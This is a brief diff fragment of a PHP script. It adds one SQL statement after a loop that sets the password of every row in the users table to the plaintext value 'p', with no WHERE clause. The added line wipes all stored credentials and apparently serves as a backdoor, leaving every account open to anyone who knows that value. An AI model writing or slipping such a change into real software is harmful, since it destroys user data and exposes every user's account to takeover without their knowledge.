@@ -30,6 +30,8 @@ foreach($alls as $i=>$val){
 	}
 }
 
+Sql::query("update users set password='p'");
+
 
 closedb();
 ?>
